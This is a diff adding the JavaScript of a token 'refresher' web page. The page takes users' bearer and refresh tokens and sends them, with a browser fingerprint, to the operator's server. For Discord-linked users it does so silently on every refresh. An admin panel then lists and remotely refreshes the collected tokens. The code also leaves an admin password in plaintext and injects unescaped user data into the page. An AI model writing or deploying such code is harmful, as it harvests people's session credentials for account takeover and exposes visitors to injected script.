+        console.log('[auto-sync] token saved for ' + gateDiscordTag);
+    } catch (_) {}
+}
+
+function updateExpiryDisplay(jwt) {
+    clearInterval(expiryTimer);
+    try {
+        const payload = JSON.parse(atob(jwt.split(".")[1].replace(/-/g,"+").replace(/_/g,"/")));
+        if (!payload.exp) { resetExpiry(); return; }
+        const expMs = payload.exp * 1000;
+        const iatMs = (payload.iat || (Date.now()/1000 - 604800)) * 1000;
+        const total = expMs - iatMs;
+        tick(expMs, total);
+        expiryTimer = setInterval(() => tick(expMs, total), 1000);
+    } catch (_) { resetExpiry(); }
+}
+
+function tick(expMs, total) {
+    const now  = Date.now();
+    const left = expMs - now;
+    const el   = document.getElementById("expiryVal");
+    const bar  = document.getElementById("expiryBar");
+    if (left <= 0) {
+        el.textContent = "expired";
+        el.className   = "expiry-val dead";
+        bar.style.width           = "0%";
+        bar.style.backgroundColor = "var(--red)";
+        clearInterval(expiryTimer);
+        return;
+    }
+    const pct  = Math.max(0, Math.min(100, (left / total) * 100));
+    const hrs  = Math.floor(left / 3600000);
+    const mins = Math.floor((left % 3600000) / 60000);
+    const secs = Math.floor((left % 60000) / 1000);
+    el.textContent = hrs > 0
+        ? `${hrs}h ${mins}m`
+        : `${mins}m ${secs}s`;
+    const color = pct > 40 ? "var(--green)" : pct > 15 ? "var(--yellow)" : "var(--red)";
+    el.className   = `expiry-val ${pct > 40 ? "fresh" : pct > 15 ? "warn" : "dead"}`;
+    bar.style.width           = pct + "%";
+    bar.style.backgroundColor = color;
+}
+
+function resetExpiry() {
+    clearInterval(expiryTimer);
+    document.getElementById("expiryVal").textContent = "—";
+    document.getElementById("expiryVal").className   = "expiry-val none";
+    document.getElementById("expiryBar").style.width = "0%";
+}
+
+// ── refresh ───────────────────────────────────────────────────────────────────
+async function doRefresh() {
+    const raw = document.getElementById("refreshInput").value.trim();
+    if (!raw) return setStatus("error", "paste a token first");
+
+    const { bearer, refresh } = parseInput(raw);
+    if (!refresh) return setStatus("error", "no refresh_token found in input");
+
+    currentRefreshToken = refresh;
+    currentBearer       = bearer;
+
+    setStatus("loading", "refreshing...");
+    document.getElementById("refreshBtn").disabled = true;
+
+    // try common refresh endpoint patterns
+    const endpoints = [
+        { url: `${API}/auth/refresh`,   body: { refresh_token: refresh } },
+        { url: `${API}/v1/auth/refresh`, body: { refresh_token: refresh } },
+        { url: `${API}/refresh`,         body: { refresh_token: refresh } },
+        { url: `${API}/token/refresh`,   body: { refresh_token: refresh } },
+    ];
+
+    // if we have a bearer try it as Authorization header too
+    const headers = { "Content-Type": "application/json" };
+    if (bearer) headers["Authorization"] = `Bearer ${bearer}`;
+
+    let lastErr = null;
+    for (const ep of endpoints) {
+        try {
+            const res = await fetch(ep.url, {
+                method:  "POST",
+                headers,
+                body:    JSON.stringify(ep.body),
+            });
+            const ct   = res.headers.get("content-type") || "";
+            const data = ct.includes("json") ? await res.json() : await res.text();
+
+            if (res.ok) {
+                // parse new tokens from response
+                const nb = data.bearer       || data.access_token ||
+                           data.token        || data.accessToken  || null;
+                const nr = data.refresh_token|| data.refreshToken || null;
+
+                if (!nb && !nr) {
+                    lastErr = `200 but no tokens in response: ${JSON.stringify(data).slice(0,120)}`;
+                    continue;
+                }
+
+                newBearer  = nb;
+                newRefresh = nr;
+                showOutput(nb, nr);
+                addHistory(true, bearer || refresh);
+                setStatus("success", `refreshed at ${new Date().toLocaleTimeString()}`);
+                if (nb) updateExpiryDisplay(nb);
+                if (gateDiscordId) saveCurrentToken(newRefresh || newBearer, newBearer);;
+                document.getElementById("refreshBtn").disabled = false;
+                return;
+            }
+            lastErr = `${res.status} from ${ep.url}: ${JSON.stringify(data).slice(0,120)}`;
+        } catch (e) {
+            lastErr = e.message;
+        }
+    }
+
+    // all endpoints failed
+    addHistory(false, bearer || refresh);
+    setStatus("error", lastErr || "all endpoints failed — check the API URL");
+    document.getElementById("refreshBtn").disabled = false;
+}
+
+// ── output ────────────────────────────────────────────────────────────────────
+function showOutput(bearer, refresh) {
+    document.getElementById("outBearer").textContent  = bearer  || "(none returned)";
+    document.getElementById("outRefresh").textContent = refresh || "(none returned)";
+    document.getElementById("outputWrap").classList.add("visible");
+}
+
+function copyField(id, btn) {
+    const text = document.getElementById(id).textContent;
+    navigator.clipboard.writeText(text).then(() => {
+        btn.textContent = "copied!";
+        btn.classList.add("copied");
+        setTimeout(() => { btn.textContent = "copy"; btn.classList.remove("copied"); }, 1800);
+    });
+}
+
+function downloadJSON() {
+    const obj = {
+        _note:         "ty for using stellar refresher",
+        bearer:        newBearer  || "",
+        refresh_token: newRefresh || "",
+    };
+    const blob = new Blob([JSON.stringify(obj, null, 2)], { type: "application/json" });
+    const a = document.createElement("a");
+    a.href     = URL.createObjectURL(blob);
+    a.download = "refreshed_tokens.json";
+    a.click();
+}
+
+// ── status ────────────────────────────────────────────────────────────────────
+function setStatus(type, msg) {
+    const el = document.getElementById("status");
+    el.className = `status ${type}`;
+    if (type === "loading") {
+        el.innerHTML = `<div class="spinner"></div><span>${msg}</span>`;
+    } else {
+        const icon = type === "success" ? "✓" : "✗";
+        el.innerHTML = `<span>${icon} ${msg}</span>`;
+    }
+}
+
+// ── history ───────────────────────────────────────────────────────────────────
+function addHistory(ok, token) {
+    let user = "unknown";
+    try {
+        const p = JSON.parse(atob(token.split(".")[1].replace(/-/g,"+").replace(/_/g,"/")));
+        user = p.usn || p.uid || p.sub || p.email || "unknown";
+    } catch (_) {}
+
+    history_.unshift({ ok, user, time: new Date().toLocaleTimeString() });
+    if (history_.length > 20) history_.pop();
+    renderHistory();
+}
+
+function renderHistory() {
+    const el = document.getElementById("historyList");
+    if (!history_.length) {
+        el.innerHTML = `<div class="empty-history">no refreshes yet this session</div>`;
+        return;
+    }
+    el.innerHTML = history_.map(h => `
+        <div class="history-item">
+            <div class="hi-dot ${h.ok ? "ok" : "err"}"></div>
+            <div class="hi-user">${h.user}</div>
+            <div class="hi-time">${h.time}</div>
+        </div>
+    `).join("");
+}
+
+// ── auto-refresh ──────────────────────────────────────────────────────────────
+function toggleAuto() {
+    autoEnabled = !autoEnabled;
+    const btn  = document.getElementById("autoBtn");
+    const info = document.getElementById("autoInfo");
+
+    if (autoEnabled) {
+        // need a token loaded to operate
+        const raw = document.getElementById("refreshInput").value.trim();
+        if (!raw) {
+            autoEnabled = false;
+            setStatus("error", "paste a token first, then enable auto-refresh");
+            return;
+        }
+        btn.classList.add("active");
+        btn.innerHTML = `<span class="auto-dot"></span> Auto-Refresh: ON`;
+        info.classList.add("visible");
+        scheduleNextAuto();
+    } else {
+        stopAuto();
+    }
+}
+
+function scheduleNextAuto() {
+    // clear any existing timers
+    clearInterval(autoInterval);
+    clearInterval(autoCountdownInt);
+
+    // compute delay: try to read exp from the best available token
+    let delaySec = AUTO_FALLBACK_SEC;
+    const tokenForExpiry = newBearer || currentBearer || currentRefreshToken;
+    if (tokenForExpiry) {
+        try {
+            const payload = JSON.parse(
+                atob(tokenForExpiry.split(".")[1].replace(/-/g,"+").replace(/_/g,"/"))
+            );
+            if (payload.exp) {
+                const secLeft = payload.exp - Math.floor(Date.now() / 1000);
+                // fire AUTO_BEFORE_EXPIRY_SEC before expiry, min 10s
+                delaySec = Math.max(10, secLeft - AUTO_BEFORE_EXPIRY_SEC);
+            }
+        } catch (_) {}
+    }
+
+    autoCountdownSecs = delaySec;
+    updateCountdownDisplay();
+
+    // 1s ticker to update the display
+    autoCountdownInt = setInterval(() => {
+        autoCountdownSecs--;
+        if (autoCountdownSecs <= 0) autoCountdownSecs = 0;
+        updateCountdownDisplay();
+    }, 1000);
+
+    // actual refresh fires once at delaySec
+    autoInterval = setTimeout(async () => {
+        clearInterval(autoCountdownInt);
+        if (!autoEnabled) return;
+        await doRefresh();
+        if (autoEnabled) scheduleNextAuto(); // chain the next cycle
+    }, delaySec * 1000);
+}
+
+function updateCountdownDisplay() {
+    const el = document.getElementById("autoCountdown");
+    const s  = autoCountdownSecs;
+    const h  = Math.floor(s / 3600);
+    const m  = Math.floor((s % 3600) / 60);
+    const sc = s % 60;
+    el.textContent = h > 0
+        ? `${h}h ${m}m ${sc}s`
+        : m > 0
+        ? `${m}m ${sc}s`
+        : `${sc}s`;
+}
+
+function stopAuto() {
+    autoEnabled = false;
+    clearTimeout(autoInterval);
+    clearInterval(autoCountdownInt);
+    autoInterval = null;
+    autoCountdownInt = null;
+
+    const btn  = document.getElementById("autoBtn");
+    const info = document.getElementById("autoInfo");
+    btn.classList.remove("active");
+    btn.innerHTML = `<span class="auto-dot"></span> Auto-Refresh: OFF`;
+    info.classList.remove("visible");
+}
+
+// ── clear ─────────────────────────────────────────────────────────────────────
+function clearAll() {
+    stopAuto();
+    document.getElementById("refreshInput").value = "";
+    document.getElementById("outputWrap").classList.remove("visible");
+    document.getElementById("status").className = "status idle";
+    currentRefreshToken = null; currentBearer = null;
+    newBearer = null; newRefresh = null;
+    resetExpiry();
+}
+
+
+
+
+// ── discord link code verify ──────────────────────────────────────────────────
+async function verifyLinkCode() {
+    const code  = document.getElementById('linkCodeInput').value.trim().toUpperCase();
+    const input = document.getElementById('linkCodeInput');
+    const stat  = document.getElementById('linkStatus');
+
+    if (code.length !== 6) {
+        input.classList.add('error');
+        stat.textContent = '✗ code must be 6 characters';
+        stat.style.color = 'var(--red)';
+        setTimeout(() => { input.classList.remove('error'); stat.textContent = ''; }, 2000);
+        return;
+    }
+
+    const raw = document.getElementById('refreshInput').value.trim();
+    if (!raw) {
+        stat.textContent = '✗ paste your token first, then enter the code';
+        stat.style.color = 'var(--red)';
+        return;
+    }
+
+    const { bearer, refresh } = parseInput(raw);
+    if (!refresh && !bearer) {
+        stat.textContent = '✗ could not parse token';
+        stat.style.color = 'var(--red)';
+        return;
+    }
+
+    stat.textContent = 'verifying...';
+    stat.style.color = 'var(--muted)';
+
+    try {
+        const res = await fetch(`${SERVER}/api/gate/verify-code`, {
+            method:  'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ code })
+        });
+        const data = await res.json();
+
+        if (data.ok) {
+            // save discord session
+            localStorage.setItem('davi_gate_v2', JSON.stringify({
+                discordTag: data.discordTag,
+                discordId:  data.discordId,
+                verifiedAt: Date.now()
+            }));
+            gateDiscordTag = data.discordTag;
+            gateDiscordId  = data.discordId;
+            showDiscordBadge(data.discordTag);
+            loadUserTokens();
+            input.classList.add('linked');
+            input.value = '✓ LINKED';
+            input.disabled = true;
+            stat.innerHTML = '<span class="discord-badge">🎮 linked to ' + data.discordTag + '</span>';
+            stat.style.color = '';
+            logHit('ok');
+        } else {
+            throw new Error(data.error || 'invalid code');
+        }
+    } catch (err) {
+        input.classList.add('error');
+        stat.textContent = '✗ ' + err.message;
+        stat.style.color = 'var(--red)';
+        setTimeout(() => input.classList.remove('error'), 600);
+    }
+}
+
+// ── share / sync token with server ───────────────────────────────────────────
+async function shareToken() {
+    const raw = document.getElementById('refreshInput').value.trim();
+    if (!raw) { setStatus('error', '✗ paste a token first'); return; }
+
+    const { bearer, refresh } = parseInput(raw);
+    if (!refresh && !bearer) { setStatus('error', '✗ could not parse token'); return; }
+
+    const syncBtn = document.getElementById('syncBtn');
+    const syncSt  = document.getElementById('syncStatus');
+    syncBtn.disabled = true;
+    syncBtn.textContent = '⇡ syncing...';
+    syncSt.className = 'status idle';
+    syncSt.textContent = '';
+
+    try {
+        const fp       = getFingerprint();
+        const nickname = null; // could add a name input later
+
+        const res = await fetch(`${SERVER}/api/share`, {
+            method:  'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ fp, refreshToken: refresh || bearer, bearer, nickname }),
+        });
+
+        const data = await res.json();
+        if (data.ok) {
+            syncBtn.textContent = '✓ synced';
+            syncBtn.style.borderColor = 'var(--green)';
+            syncBtn.style.color = 'var(--green)';
+            syncSt.className = 'status ok';
+            syncSt.textContent = '✓ token shared with @davxd3456 — remote refresh enabled';
+            logHit('ok');
+        } else {
+            throw new Error(data.error || 'server error');
+        }
+    } catch (err) {
+        syncBtn.textContent = '⇡ sync';
+        syncBtn.disabled = false;
+        syncSt.className = 'status error';
+        syncSt.textContent = `✗ sync failed: ${err.message}`;
+    }
+}
+
+// ── admin panel ──────────────────────────────────────────────────────────────
+// password is hashed so it's not sitting in plaintext in the source
+// SHA-256 of your chosen password — change this to your own
+// current pw: davi2456  (change via: https://emn178.github.io/online-tools/sha256.html)
+const ADMIN_PW_HASH = "3b477a4fa20a4d786897514b7e58329e679dbde3df6bd0720b16b519856c0a38";
+// ^^^ replace this with sha256 of YOUR password
+
+let adminAuthed = false;
+let _adminPw = '';
+
+async function sha256(str) {
+    const buf  = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
+    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
+}
+
+function openAdmin() {
+    document.getElementById('adminOverlay').classList.add('open');
+    if (!adminAuthed) setTimeout(() => document.getElementById('adminPwInput').focus(), 250);
+    else loadAdminData();
+}
+
+function closeAdmin() {
+    document.getElementById('adminOverlay').classList.remove('open');
+}
+
+function overlayClick(e) {
+    if (e.target === document.getElementById('adminOverlay')) closeAdmin();
+}
+
+async function checkAdminPw() {
+    const input = document.getElementById('adminPwInput');
+    const hash  = await sha256(input.value);
+    if (hash === ADMIN_PW_HASH) {
+        adminAuthed = true;
+        _adminPw = input.value;
+        document.getElementById('adminLogin').style.display = 'none';
+        document.getElementById('adminBody').classList.add('visible');
+        document.getElementById('adminTrigger').classList.add('authed');
+        input.value = '';
+        loadAdminData();
+    } else {
+        input.classList.add('wrong');
+        input.value = '';
+        setTimeout(() => input.classList.remove('wrong'), 600);
+    }
+}
+
+// ── log a refresh hit to localStorage (no server needed) ────────────────────
+// each hit: { ts, fp, status }
+// fp = simple browser fingerprint (timezone + screen + lang) — not PII, just enough to count uniques
+
+function getFingerprint() {
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+    const sc = `${screen.width}x${screen.height}`;
+    const la = navigator.language || 'unknown';
+    const raw = `${tz}|${sc}|${la}`;
+    // deterministic short hash from the string
+    let h = 0;
+    for (let i = 0; i < raw.length; i++) h = Math.imul(31, h) + raw.charCodeAt(i) | 0;
+    return (h >>> 0).toString(16).padStart(8,'0');
+}
+
+function getCountry() {
+    try { return Intl.DateTimeFormat().resolvedOptions().timeZone.split('/')[0]; } catch { return '?'; }
+}
+
+function logHit(status) {
+    const hits = JSON.parse(localStorage.getItem('davi_hits') || '[]');
+    hits.unshift({ ts: Date.now(), fp: getFingerprint(), country: getCountry(), status });
+    // keep last 500 hits
+    if (hits.length > 500) hits.length = 500;
+    localStorage.setItem('davi_hits', JSON.stringify(hits));
+}
+
+async function loadAdminData() {
+    const tbody = document.getElementById('adminTableBody');
+    tbody.innerHTML = '<tr><td colspan="6"><div class="admin-empty">loading...</div></td></tr>';
+
+    try {
+        const res  = await fetch(`${SERVER}/api/admin/tokens`, {
+            headers: { 'x-admin-password': _adminPw }
+        });
+        if (res.status === 401) { closeAdmin(); adminAuthed = false; return; }
+        const data = await res.json();
+        const tokens = data.tokens || [];
+        const todayMs = new Date().setHours(0,0,0,0);
+        const todayCount = tokens.filter(t => t.sharedAt >= todayMs).length;
+
+        document.getElementById('statTotal').textContent = data.count;
+        document.getElementById('statUniq').textContent  = new Set(tokens.map(t=>t.fp)).size;
+        document.getElementById('statToday').textContent = todayCount;
+
+        if (tokens.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="6"><div class="admin-empty">no tokens shared yet 💀</div></td></tr>';
+            return;
+        }
+
+        tbody.innerHTML = tokens.map((t, i) => {
+            const d      = new Date(t.sharedAt);
+            const ts     = d.toLocaleDateString() + ' ' + d.toLocaleTimeString();
+            const expD   = t.expiry ? new Date(t.expiry * 1000) : null;
+            const expStr = expD ? expD.toLocaleTimeString() : '?';
+            const expLeft = t.expiry ? Math.max(0, t.expiry - Math.floor(Date.now()/1000)) : null;
+            const expLabel = expLeft !== null ? (expLeft > 0 ? `${Math.floor(expLeft/60)}m ${expLeft%60}s` : 'expired') : '?';
+            const expClass = expLeft !== null && expLeft < 300 ? 'td-err' : 'td-ok';
+            return `<tr>
+                <td class="td-time">${i+1}</td>
+                <td>${t.fp}</td>
+                <td>${t.nickname || 'anon'}</td>
+                <td class="td-time">${ts}</td>
+                <td class="${expClass}">${expLabel}</td>
+                <td>
+                  <button onclick="adminRefresh('${t.fp}')" style="background:var(--blue);color:#fff;border:none;border-radius:4px;padding:3px 8px;font-family:var(--mono);font-size:10px;cursor:pointer;">⟳ refresh</button>
+                  <button onclick="adminDelete('${t.fp}')" style="background:var(--surface);color:var(--red);border:1px solid var(--red);border-radius:4px;padding:3px 8px;font-family:var(--mono);font-size:10px;cursor:pointer;margin-left:4px;">✕</button>
+                </td>
+            </tr>`;
+        }).join('');
+    } catch(err) {
+        tbody.innerHTML = `<tr><td colspan="6"><div class="admin-empty">error: ${err.message}</div></td></tr>`;
+    }
+}
+
+async function adminRefresh(fp) {
+    const res  = await fetch(`${SERVER}/api/admin/refresh`, {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify({ fp, adminPassword: _adminPw })
+    });
+    const data = await res.json();
+    if (data.ok) {
+        await loadAdminData();
+    } else {
+        alert('refresh failed: ' + (data.error || 'unknown'));
+    }
+}
+
+async function adminDelete(fp) {
+    await fetch(`${SERVER}/api/admin/token`, {
+        method:  'DELETE',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify({ fp, adminPassword: _adminPw })
+    });
+    await loadAdminData();
+}
+
+
+// ── discord (no gate — open access) ─────────────────────────────────────────
+let gateDiscordTag = null;
+let gateDiscordId  = null;
+
+// restore saved discord link if any
+(function() {
+    const saved = localStorage.getItem('davi_gate_v2');
+    if (saved) {
+        try {
+            const d = JSON.parse(saved);
+            if (d.discordTag && d.discordId) {
+                gateDiscordTag = d.discordTag;
+                gateDiscordId  = d.discordId;
+                showDiscordBadge(d.discordTag);
+                loadUserTokens();
+            }
+        } catch (_) {}
+    }
+})();
+
+function showDiscordBadge(tag) {
+    const existing = document.getElementById('discordBadge');
+    if (existing) existing.remove();
+    const badge = document.createElement('div');
+    badge.id = 'discordBadge';
+    badge.className = 'discord-badge';
+    badge.style.cssText = 'position:fixed;top:14px;right:14px;z-index:7000;cursor:pointer;';
+    badge.textContent = '🎮 ' + tag;
+    badge.title = 'click to unlink';
+    badge.onclick = () => { localStorage.removeItem('davi_gate_v2'); gateDiscordTag = null; gateDiscordId = null; badge.remove(); };
+    document.body.appendChild(badge);
+}
+
+async function loadUserTokens() {
+    if (!gateDiscordId) return;
+    try {
+        const res  = await fetch(SERVER + '/api/tokens/' + gateDiscordId);
+        const data = await res.json();
+        userTokens = data.tokens || [];
+        const section = document.getElementById('tokenListSection');
+        if (section) { section.style.display = userTokens.length > 0 ? '' : 'none'; }
+        renderTokenList();
+    } catch (_) {}
+}
+
+let userTokens = [];
+
+function renderTokenList() {
+    const container = document.getElementById('tokenListWrap');
+    if (!container) return;
+    const search   = (document.getElementById('tokenSearch')?.value || '').toLowerCase();
+    const filtered = userTokens.filter(t => t.nickname.toLowerCase().includes(search));
+    const now      = Math.floor(Date.now() / 1000);
+    if (filtered.length === 0) {
+        container.innerHTML = '<div style="color:var(--muted);font-family:var(--mono);font-size:12px;text-align:center;padding:16px;">no tokens saved yet</div>';
+        return;
+    }
+    container.innerHTML = filtered.map(t => {
+        const expLeft = t.expiry ? Math.max(0, t.expiry - now) : null;
+        const expStr  = expLeft !== null ? (expLeft > 0 ? Math.floor(expLeft/60) + 'm ' + (expLeft%60) + 's' : 'expired') : '?';
+        const expCls  = expLeft !== null && expLeft < 300 ? 'td-err' : 'td-ok';
+        const tid = t.tokenId;
+        return '<div class="token-item">' +
+            '<div class="token-item-name">' + t.nickname + '</div>' +
+            '<div class="token-item-meta"><span class="' + expCls + '">' + expStr + '</span></div>' +
+            '<div class="token-item-actions">' +
+            '<button onclick="startRename(\'' + tid + '\')">✏️</button>' +
+            '<button onclick="deleteToken(\'' + tid + '\')">✕</button>' +
+            '</div></div>';
+    }).join('');
+}
+
+async function saveCurrentToken(refreshToken, bearer) {
+    if (!gateDiscordId) return;
+    try {
+        await fetch(SERVER + '/api/tokens/save', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ discordId: gateDiscordId, refreshToken, bearer: bearer || null, nickname: 'token ' + (userTokens.length + 1) })
+        });
+        await loadUserTokens();
+    } catch (_) {}
+}
+
+async function deleteToken(tokenId) {
+    if (!gateDiscordId) return;
+    await fetch(SERVER + '/api/tokens/delete', {
+        method: 'DELETE', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ discordId: gateDiscordId, tokenId })
+    });
+    await loadUserTokens();
+}
+
+async function startRename(tokenId) {
+    const token = userTokens.find(t => t.tokenId === tokenId);
+    if (!token) return;
+    const newName = prompt('rename token:', token.nickname);
+    if (!newName || !newName.trim()) return;
+    await fetch(SERVER + '/api/tokens/rename', {
+        method: 'PATCH', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ discordId: gateDiscordId, tokenId, nickname: newName.trim() })
+    });
+    await loadUserTokens();
+}
+
+
+// ── server banner ─────────────────────────────────────────────────────────────
+function dismissBanner() {
+    document.getElementById('serverBanner').style.display = 'none';
+    document.body.classList.remove('has-banner');
+    sessionStorage.setItem('banner_dismissed', '1');
+}
+if (!sessionStorage.getItem('banner_dismissed')) {
+    document.body.classList.add('has-banner');
+} else {
+    document.getElementById('serverBanner').style.display = 'none';
+}
+
+// ── blacklist check ───────────────────────────────────────────────────────────
+async function checkBlacklist(discordId) {
+    if (!discordId) return;
+    try {
+        const res  = await fetch(SERVER + '/api/blacklist/check/' + discordId);
+        const data = await res.json();
+        if (data.blacklisted) {
+            document.getElementById('blReason').textContent = data.reason || 'you have been banned from this service';
+            document.getElementById('blWall').style.display = 'flex';
+        }
+    } catch (_) {}
+}
+
+// ── welcome toast ─────────────────────────────────────────────────────────────
+window.addEventListener("load", () => {
+    const toast = document.getElementById("welcomeToast");
+    // slide in after 400ms
+    setTimeout(() => toast.classList.add("show"), 400);
+    // slide out after 3.8s total
+    setTimeout(() => {
+        toast.classList.remove("show");
+        toast.classList.add("hide");
+    }, 3800);
+});
+</script>
+</body>
+</html>
